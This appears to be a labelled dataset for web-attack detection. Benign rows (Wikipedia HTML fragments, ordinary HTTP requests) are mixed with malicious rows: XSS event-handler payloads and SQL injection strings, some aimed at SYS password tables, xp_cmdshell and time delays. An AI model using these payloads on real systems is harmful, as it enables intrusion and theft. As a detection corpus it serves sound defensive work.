+"<li id=""pt-anontalk""><a href=""/wiki/Special:MyTalk"" title=""Discussion about edits from this IP address [n]"" accesskey=""n"">Talk </a> </li><li id=""pt-anoncontribs""><a href=""/wiki/Special:MyContributions"" title=""A list of edits made from this IP address [y]"" accesskey=""y"">Contributions </a> </li><li id=""pt-createaccount""><a href=""/w/index.php?title=Special:CreateAccount&amp;returnto=Artificial+intelligence"" title=""You are encouraged to create an account and log in; however, it is not mandatory"">Create account </a> </li><li id=""pt-login""><a href=""/w/index.php?title=Special:UserLogin&amp;returnto=Artificial+intelligence"" title=""You&#039;re encouraged to log in; however, it&#039;s not mandatory. [o]"" accesskey=""o"">Log in </a> </li>",0
+"<command onkeypress=""alert(1)"" contenteditable>test</command>",1
+GET /products?id=42,0
+"<div class=""body"">",0
+""" or isNULL ( 1/0 )  /*",1
+<li onpointerover=alert(1)>XSS</li>,1
+"</p><p><a href=""/wiki/Default_logic"" title=""Default logic"">Default logics </a>, <a href=""/wiki/Non-monotonic_logic"" title=""Non-monotonic logic"">non-monotonic logics </a> and <a href=""/wiki/Circumscription_(logic)"" title=""Circumscription (logic)"">circumscription </a><sup id=""cite_ref-Default_reasoning_and_non-monotonic_logic_105-1"" class=""reference""><a href=""#cite_note-Default_reasoning_and_non-monotonic_logic-105"">&#91;102&#93; </a> </sup> are forms of logic designed to help with default reasoning and the <a href=""/wiki/Qualification_problem"" title=""Qualification problem"">qualification problem </a>. Several extensions of logic have been designed to handle specific domains of <a href=""/wiki/Knowledge_representation"" class=""mw-redirect"" title=""Knowledge representation"">knowledge </a>, such as: <a href=""/wiki/Description_logic"" title=""Description logic"">description logics </a>;<sup id=""cite_ref-Representing_categories_and_relations_93-1"" class=""reference""><a href=""#cite_note-Representing_categories_and_relations-93"">&#91;90&#93; </a> </sup> <a href=""/wiki/Situation_calculus"" title=""Situation calculus"">situation calculus </a>, <a href=""/wiki/Event_calculus"" title=""Event calculus"">event calculus </a> and <a href=""/wiki/Fluent_calculus"" title=""Fluent calculus"">fluent calculus </a> (for representing events and time);<sup id=""cite_ref-Representing_time_94-1"" class=""reference""><a href=""#cite_note-Representing_time-94"">&#91;91&#93; </a> </sup> <a href=""/wiki/Causality#Causal_calculus"" title=""Causality"">causal calculus </a>;<sup id=""cite_ref-Representing_causation_95-1"" class=""reference""><a href=""#cite_note-Representing_causation-95"">&#91;92&#93; </a> </sup> <a href=""/wiki/Belief_revision"" title=""Belief revision"">belief calculus (belief revision) </a>;<sup id=""cite_ref-203"" class=""reference""><a href=""#cite_note-203"">&#91;198&#93; </a> </sup> and <a href=""/wiki/Modal_logic"" title=""Modal logic"">modal logics </a>.<sup id=""cite_ref-Representing_knowledge_about_knowledge_96-1"" class=""reference""><a href=""#cite_note-Representing_knowledge_about_knowledge-96"">&#91;93&#93; </a> </sup> Logics to model contradictory or inconsistent statements arising in multi-agent systems have also been designed, such as <a href=""/wiki/Paraconsistent_logic"" title=""Paraconsistent logic"">paraconsistent logics </a>.",0
+"<li><a href=""/wiki/Computing_platform"" title=""Computing platform"">Computing platform </a> </li>",0
+GET /search?q=headphones,0
+"select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",1
+"</span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=2"" title=""Edit section: Definitions"">edit </a><span class=""mw-editsection-bracket"">]",0
+"<li id=""cite_note-65""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-65"">^ </a> </b>",0
+"select * from users where id = '1' union select !<@,version (  )  -- 1'",1
+1;SELECT *,1
+"<li id=""cite_note-Knowledge_representation-91""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Knowledge_representation_91-0"">^ </a> </b>",0
+"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;356–373 </li>",0
+GET /about,0
+"select * from users where id = 1 union select !<@,version (  )  -- 1",1
+select * from users where id = '1' + $+%\ or 1 = 1 -- 1',1
+GET /products?id=45,0
+select * from users where id = 1.<@$ or 1 = 1 -- 1,1
+"</span>. <i>AI Matters </i>. <b>1 </b> (1): 9–11. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1145%2F2639475.2639478"">10.1145/2639475.2639478 </a>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160115114604/http://www.sophia.de/pdf/2014_PT-AI_polls.pdf"">Archived </a> <span class=""cs1-format"">(PDF)",0
+"select * from users where id = '1' union select +\#,@@VERSION -- 1'",1
+"<li id=""cite_note-WERBOS1974-241""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-WERBOS1974_241-0"">^ </a> </b>",0
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;449–455 </li> </ul>",0
+"<li><a href=""/wiki/Behavior_selection_algorithm"" title=""Behavior selection algorithm"">Behavior selection algorithm </a> </li>",0
+",s",1
+"<marquee onmouseout=""alert(1)"">test</marquee>",1
+"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_7-64""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_7_64-0"">^ </a> </b>",0
+"<del onclick=""alert(1)"">test</del>",1
+"<sub onmouseover=""alert(1)"">test</sub>",1
+"<hr onclick=""alert(1)"">test</hr>",1
+GET /products?id=26,0
+0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1
+"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Kismet&amp;rft.pub=MIT+Artificial+Intelligence+Laboratory%2C+Humanoid+Robotics+Group&amp;rft_id=http%3A%2F%2Fwww.ai.mit.edu%2Fprojects%2Fhumanoid-robotics-group%2Fkismet%2Fkismet.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<iframe oncopy=""alert(1)"" contenteditable>test</iframe>",1
+GET /products?id=33,0
+"<div style=""width:52px""><a href=""/wiki/File:Question_book-new.svg"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/50px-Question_book-new.svg.png"" decoding=""async"" width=""50"" height=""39"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/75px-Question_book-new.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/100px-Question_book-new.svg.png 2x"" data-file-width=""512"" data-file-height=""399"" /> </a> </div> </td><td class=""mbox-text"">",0
+"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",1
+"<ul draggable=""true"" ondrag=""alert(1)"">test</ul>",1
+GET /products?id=9,0
+"<ul><li><a href=""/wiki/Software_development_process"" title=""Software development process"">Software development process </a> </li>",0
+""";waitfor delay '0:0:__TIME__'--",1
+"<div draggable=""true"" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>",1
+GET /search?q=webcam,0
+"<body onmouseover=""alert(1)"">test</body>",1
+<rtc id=x tabindex=1 onfocus=alert(1)></rtc>,1
+"select * from users where id = 1 <@$$ union select 1,version (  )  -- 1",1
+</h3>,0
+"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --",1
+"<svg onmouseleave=""alert(1)"">test</svg>",1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i,1
+<ruby onpointermove=alert(1)>XSS</ruby>,1
+GET /products?id=25,0
+' or 2 > 1,1
+<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>,1
+GET /products?id=53,0
+GET /products?id=36,0
+"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=AI%4050%3A+AI+Past%2C+Present%2C+Future&amp;rft.place=Dartmouth+College&amp;rft.date=2006&amp;rft.aulast=Maker&amp;rft.aufirst=Meg+Houston&amp;rft_id=http%3A%2F%2Fwww.engagingexperience.com%2F2006%2F07%2Fai50_ai_past_pr.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<p class=""mw-empty-elt"">",0
+"<del onmouseout=""alert(1)"">test</del>",1
+"select * from users where id = '1' +  ( \. )  union select 1,@@VERSION -- 1'",1
+GET /faq,0
+"<li><a href=""/wiki/Ludwig_von_Bertalanffy"" title=""Ludwig von Bertalanffy"">Ludwig von Bertalanffy </a> </li>",0
+Ã½ or 1 = 1 --,1
+"<LINK REL=""stylesheet"" HREF=""javascript:alert('');"">",1
+"<ul><li><a href=""/wiki/Swarm_intelligence"" title=""Swarm intelligence"">Swarm intelligence </a> </li>",0
+"select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1
+"select * from users where id = 1 union select 1<@,version (  )  -- 1",1
+declare @s varchar ( 200 )  select @s  =  0x77616974 ...,1
+.s,1
+select * from users where id = '1' *$ 1 or 1 = 1 -- 1',1
+"select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",1
+"<li><a href=""/wiki/Domain-specific_language"" title=""Domain-specific language"">Domain-specific language </a> </li>",0
+select * from users where id = 1 or \+<\ or 1 = 1 -- 1,1
+"select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",1
+"<h2><span class=""mw-headline"" id=""History"">History",0
+"<li><span><a href=""/wiki/File:Octicons-terminal.svg"" class=""image""><img alt=""icon"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Octicons-terminal.svg/24px-Octicons-terminal.svg.png"" decoding=""async"" width=""24"" height=""28"" class=""noviewer"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Octicons-terminal.svg/37px-Octicons-terminal.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Octicons-terminal.svg/49px-Octicons-terminal.svg.png 2x"" data-file-width=""896"" data-file-height=""1024"" /> </a>",0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
+<keygen onpointerout=alert(1)>XSS</keygen>,1
+GET /products/view?id=46,0
+"<li id=""cite_note-376""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-376"">^ </a> </b>",0
+"select * from users where id = 1 or 1#""? or 1 = 1 -- 1",1
+or,1
+"<ul class=""menu"" >",0
+"<div class=""magnify""><a href=""/wiki/File:ParticleSwarmArrowsAnimation.gif"" class=""internal"" title=""Enlarge""> </a> </div>A <a href=""/wiki/Particle_swarm_optimization"" title=""Particle swarm optimization"">particle swarm </a> seeking the <a href=""/wiki/Global_minimum"" class=""mw-redirect"" title=""Global minimum"">global minimum </a> </div> </div> </div>",0
+GET /admin/users,1
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;916–932 </li> </ul>",0
+"<element onmouseover=""alert(1)"">test</element>",1
+"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>",0
+"<meta charset=""utf-8"">",0
+' or username is not NULL or username  =  ',1
+"<var onmouseenter=""alert(1)"">test</var>",1
+<video onpointerleave=alert(1)>XSS</video>,1
+' or 'x' = 'x,1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i,1
+</li>,0
+POST /checkout,0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
+GET /blog?id=5,0
+GET /search?q=tv,0
+"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://social.techcrunch.com/2019/05/03/china-smart-city-exposed/"">""Security lapse exposed a Chinese smart city surveillance system"" </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Security+lapse+exposed+a+Chinese+smart+city+surveillance+system&amp;rft_id=http%3A%2F%2Fsocial.techcrunch.com%2F2019%2F05%2F03%2Fchina-smart-city-exposed%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<h3><span class=""mw-headline"" id=""Audit"">Audit",0
+"<div draggable=""true"" contenteditable>drag me</div><area ondrop=alert(1) contenteditable>drop here</area>",1
+""" ) ;waitfor delay '0:0:__TIME__'--",1
+<time onpointermove=alert(1)>XSS</time>,1
+"select * from users where id = 1 union select !<1,version (  )  -- 1",1
+</p>,0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
+x' and members.email is NULL; --,1
+"<li id=""cite_note-77""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-77"">^ </a> </b>",0
+x' AND userid IS NULL; --,1
+"<script onmousemove=""alert(1)"">test</script>",1
+select * from users where id = 1 <@$ or 1 = 1 -- 1,1
+"<li id=""cite_note-116""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-116"">^ </a> </b>",0
+'hi' or 'x' = 'x';,1
+"</span> <span class=""reference-text""><a href=""/wiki/Paul_Werbos"" title=""Paul Werbos"">Paul Werbos </a> (1982). Applications of advances in nonlinear sensitivity analysis. In System modeling and optimization (pp. 762–770). Springer Berlin Heidelberg. <a rel=""nofollow"" class=""external text"" href=""http://werbos.com/Neural/SensitivityIFIPSeptember1981.pdf"">Online </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160414055503/http://werbos.com/Neural/SensitivityIFIPSeptember1981.pdf"">Archived </a> 14 April 2016 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a>",0
+' -- &password =,1
+GET /index.html?user=1,0
+GET /search?q=book,0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
+"<li id=""cite_note-Celli_et_al._2017-342""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Celli_et_al._2017_342-0"">^ </a> </b>",0
+"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )",1
+"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1
+update,1
+"<div style=""padding:0em 0.25em"">",0
+"select * from users where id = 1 or @#"", = 1 union select 1,version (  )  -- 1",1
+"select * from users where id = 1 + @<@. union select 1,version (  )  -- 1",1
+hi' or 'x' = 'x';,1
+"<h2><span class=""mw-headline"" id=""See_also"">See also",0
+declare @q nvarchar  ( 200 )  0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ),1
+GET /blog,0
+"<li><cite id=""CITEREFGladwell2005"" class=""citation book""><a href=""/wiki/Malcolm_Gladwell"" title=""Malcolm Gladwell"">Gladwell, Malcolm </a> (2005). <a href=""/wiki/Blink_(book)"" class=""mw-redirect"" title=""Blink (book)""><i>Blink </i> </a>. New York: Little, Brown and Co. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-316-17232-5"" title=""Special:BookSources/978-0-316-17232-5""><bdi>978-0-316-17232-5 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Blink&amp;rft.place=New+York&amp;rft.pub=Little%2C+Brown+and+Co.&amp;rft.date=2005&amp;rft.isbn=978-0-316-17232-5&amp;rft.aulast=Gladwell&amp;rft.aufirst=Malcolm&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+GET /search?q=phone,0
+POST /products/delete?id=60,1
+"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Computer_network"" title=""Computer network"">Networks </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+"select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",1
+<form onsubmit=alert(1)><input type=submit>,1
+"<keygen onmouseenter=""alert(1)"">test</keygen>",1
+( sqlattempt2 ),1
+GET /admin,1
+"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></iframe>",1
+"select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'",1
+"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;4–5 </li>",0
+"<li id=""cite_note-lin1970-239""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-lin1970_239-0"">^ </a> </b>",0
+</span></p>,0
+"select * from users where id = 1 union select @ $_,version (  )  -- 1",1
+"select * from users where id = '1' union select $ .,@@VERSION -- 1'",1
+a' or 1 = 1; --,1
+"<li id=""cite_note-311""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-311"">^ </a> </b>",0
+"<li><a href=""/wiki/Reinforcement_learning"" title=""Reinforcement learning"">Reinforcement learning </a> </li>",0
+<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>,1
+<img src=x:alert(alt) onerror=eval(src) alt=0>,1
+"</p><p>They failed to recognize the difficulty of some of the remaining tasks. Progress slowed and in 1974, in response to the criticism of <a href=""/wiki/Sir_James_Lighthill"" class=""mw-redirect"" title=""Sir James Lighthill"">Sir James Lighthill </a><sup id=""cite_ref-FOOTNOTELighthill1973_40-0"" class=""reference""><a href=""#cite_note-FOOTNOTELighthill1973-40"">&#91;40&#93; </a> </sup> and ongoing pressure from the US Congress to fund more productive projects, both the U.S. and British governments cut off exploratory research in AI. The next few years would later be called an ""<a href=""/wiki/AI_winter"" title=""AI winter"">AI winter </a>"",<sup id=""cite_ref-First_AI_winter_11-1"" class=""reference""><a href=""#cite_note-First_AI_winter-11"">&#91;11&#93; </a> </sup> a period when obtaining funding for AI projects was difficult.",0
+GET /products?id=47,0
+or 1 = 1,1
+%29,1
+"<li><a href=""/wiki/Distributed_computing"" title=""Distributed computing"">Distributed computing </a> </li>",0
+GET /blog?id=10,0
+' or 1 --',1
+"<li><a href=""/wiki/Unsupervised_learning"" title=""Unsupervised learning"">Unsupervised learning </a> </li>",0
+</span></a></dt><dd>Monitor and control a crawler using a web service.</dd>,0
+‘ or 3 = 3 --,1
+"or 1 = 1 or """" =",1
+"</span>. Morgan Kaufmann. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-1-55860-467-4"" title=""Special:BookSources/978-1-55860-467-4""><bdi>978-1-55860-467-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+A+New+Synthesis&amp;rft.pub=Morgan+Kaufmann&amp;rft.date=1998&amp;rft.isbn=978-1-55860-467-4&amp;rft.aulast=Nilsson&amp;rft.aufirst=Nils&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fartificialintell0000nils&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<i data-toggle=""wy-nav-top"" class=""fa fa-bars""></i>",0
+<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>,1
+</span> </a> </li>,0
+"<ul><li><a href=""/wiki/Artificial_development"" title=""Artificial development"">Artificial development </a> </li>",0
+<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>,1
+"<li><a href=""/wiki/Semantic_reasoner"" title=""Semantic reasoner"">Semantic reasoner </a> </li> </ul>",0
+"<li><a href=""/wiki/CMA-ES"" title=""CMA-ES"">Covariance Matrix Adaptation Evolution Strategy (CMA-ES) </a> </li>",0
+GET /index.html,0
+"<span onkeydown=""alert(1)"" contenteditable>test</span>",1
+||'6,1
+<button onpointerup=alert(1)>XSS</button>,1
+v,1
+%2A%7C,1
+"<a href=""/wiki/Dartmouth_Workshop"" class=""mw-redirect"" title=""Dartmouth Workshop"">Dartmouth conference </a>:",0
+"<li><a href=""/wiki/Multimedia_database"" title=""Multimedia database"">Multimedia information system </a> </li>",0
+<frameset><frame onload=alert(1)>,1
+"<li><a href=""/wiki/Hugh_of_Saint_Victor"" title=""Hugh of Saint Victor"">Hugh of Saint Victor </a> </li>",0
+"<li><a href=""/wiki/Problem_of_other_minds"" title=""Problem of other minds"">Problem of other minds </a> </li>",0
+"select * from users where id = 1 or "",&"" or 1 = 1 -- 1",1
+<form><input oninvalid=alert(1) required><input type=submit>,1
+1 and 1 = 1,1
+"select * from users where id = 1 union select @<@,version (  )  -- 1",1
+"<li id=""cite_note-FOOTNOTEDomingos201588-218""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos201588_218-0"">^ </a> </b>",0
+<li>take any empty square. </li> </ol>,0
+"select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'",1
+"<li class=""toclevel-1 tocsection-77""><a href=""#External_links""><span class=""tocnumber"">15",0
+select * from users where id = 1 + \+%1 or 1 = 1 -- 1,1
+"<shadow onbeforecopy=""alert(1)"" contenteditable>test</shadow>",1
+"<legend onclick=""alert(1)"">test</legend>",1
+'  ( select top 1,1
+'; exec xp_regread,1
+"</span> <span class=""reference-text""><cite class=""citation web""> <a rel=""nofollow"" class=""external text"" href=""https://ars.electronica.art/outofthebox/en/digital-humanism-conf/"">Retrieved September 2019 https://ars.electronica.art/outofthebox/en/digital-humanism-conf/ Retrieved September 2019 </a><span class=""cs1-visible-error error citation-comment""> Check <code class=""cs1-code"">&#124;url= </code> value (<a href=""/wiki/Help:CS1_errors#bad_url"" title=""Help:CS1 errors"">help </a>)",0
+"select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1
+"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;132–144 </li>",0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
+"<li><a href=""/wiki/Biocybernetics"" title=""Biocybernetics"">Biological cybernetics </a> </li>",0
+POST /products/delete?id=50,1
+GET /products/view?id=28,0
+GET /admin/reports,1
+'sqlattempt1,1
+"<head onmousemove=""alert(1)"">test</head>",1
+"</span> <span class=""toctext"">Applications",0
+"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;863–898 </li>",0
+"<address onpaste=""alert(1)"" contenteditable>test</address>",1
+<hr onpointerout=alert(1)>XSS</hr>,1
+</span> </h4>,0
+GET /products?id=35,0
+<cite id=x tabindex=1 onactivate=alert(1)></cite>,1
+<i onpointerleave=alert(1)>XSS</i>,1
+"<ul><li><a href=""/wiki/Philosophy_of_physics"" title=""Philosophy of physics"">Physics </a>",0
+"select * from users where id = 1 union select @<@$,version (  )  -- 1",1
+; exec  ( 'sel' + 'ect us' + 'er' ),1
+"<slot draggable=""true"" ondragstart=""alert(1)"">test</slot>",1
+"<nextid onbeforecut=""alert(1)"" contenteditable>test</nextid>",1
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;537–581 </li> </ul>",0
+"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=O%27Reilly+Media&amp;rft.atitle=The+state+of+AI+adoption&amp;rft.date=2017-12-18&amp;rft.aulast=Lorica&amp;rft.aufirst=Ben&amp;rft_id=https%3A%2F%2Fwww.oreilly.com%2Fideas%2Fthe-state-of-ai-adoption&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<li id=""cite_note-295""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-295"">^ </a> </b>",0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
+GET /search?q=harddrive,0
+<font id=x tabindex=1 onactivate=alert(1)></font>,1
+<ul>,0
+"<li id=""cite_note-Feedforward_neural_networks-237""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Feedforward_neural_networks_237-0"">^ </a> </b>",0
+"<multicol onmouseenter=""alert(1)"">test</multicol>",1
+"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",1
+"<dt><a class=""reference internal"" href=""topics/settings.html""><span class=""doc"">Settings",0
+"select * from users where id = 1 or ""%,"" or 1 = 1 -- 1",1
+GET /products?id=30,0
+GET /products/delete?id=10,1
+char%4039%41%2b%40SELECT,1
+"<style draggable=""true"" ondragenter=""alert(1)"">test</style>",1
+"<output onpaste=""alert(1)"" contenteditable>test</output>",1
+"<li><a href=""/wiki/Ethics_of_artificial_intelligence"" title=""Ethics of artificial intelligence"">Ethics of artificial intelligence </a> </li>",0
+POST /products/delete?id=45,1
+"<progress onmouseout=""alert(1)"">test</progress>",1
+"<h3><span class=""mw-headline"" id=""Integrating_the_approaches"">Integrating the approaches",0
+"admin"" )  or ""1"" = ""1""/*",1
+"select * from users where id = 1 or ""; ( "" or 1 = 1 -- 1",1
+; exec master..xp_cmdshell,1
+"<li><a href=""/wiki/Tabula_rasa"" title=""Tabula rasa"">Tabula rasa </a> </li>",0
+"select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",1
+"select * from users where id = 1 or "" ) ;"" or 1 = 1 -- 1",1
+"<div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Philosophy_of_mind"" title=""Template:Philosophy of mind""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Philosophy_of_mind"" title=""Template talk:Philosophy of mind""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Philosophy_of_mind&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0
+"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;111–136 </li>",0
+GET /blog?id=3,0
+"<li><a href=""/wiki/Cortana"" title=""Cortana"">Cortana </a><span class=""nowrap"">&#160;",0
+<source onpointerdown=alert(1)>XSS</source>,1
+<u onpointerout=alert(1)>XSS</u>,1
+-- &password =,1
+"select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1",1
+GET /products?id=16,0
+"<ul><li><a href=""/wiki/Accelerating_change"" title=""Accelerating change"">Accelerating change </a> </li>",0
+"<li id=""cite_note-236""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-236"">^ </a> </b>",0
+"<strike draggable=""true"" ondragend=""alert(1)"">test</strike>",1
+)  or pg_sleep ( __TIME__ ) --,1
+"<embed draggable=""true"" ondragstart=""alert(1)"">test</embed>",1
+"<div onmouseover=""alert(1)"">test</div>",1
+"<script type=""text/javascript"" src=""_static/readthedocs-data.js""></script>",0
+"</span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=1"" title=""Edit section: History"">edit </a><span class=""mw-editsection-bracket"">]",0
+select * from users where id = 1 or \<  = 1 or 1 = 1 -- 1,1
+GET /search?q=laptop,0
+"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Algorithm"" title=""Algorithm"">Algorithms </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+</div>,0
+"<a href=""/wiki/Bayesian_decision_theory"" class=""mw-redirect"" title=""Bayesian decision theory"">Bayesian decision theory </a> and Bayesian <a href=""/wiki/Decision_network"" class=""mw-redirect"" title=""Decision network"">decision networks </a>:",0
+"select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1",1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rb>",1
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;733–736 </li> </ul>",0
+,0
+%28,1
